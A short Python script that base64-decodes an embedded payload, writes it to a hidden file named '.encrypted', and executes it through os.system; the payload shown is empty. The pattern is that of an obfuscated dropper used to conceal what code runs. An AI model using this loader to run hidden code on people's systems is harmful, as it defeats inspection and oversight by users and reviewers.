import os
from base64 import b64decode

file_name = '.encrypted'
source = b64decode(b'')

try:
    with open(file_name, 'wb') as file:
        file.write(source)
    os.system('python .encrypted')
except Exception as e:
    print(e)
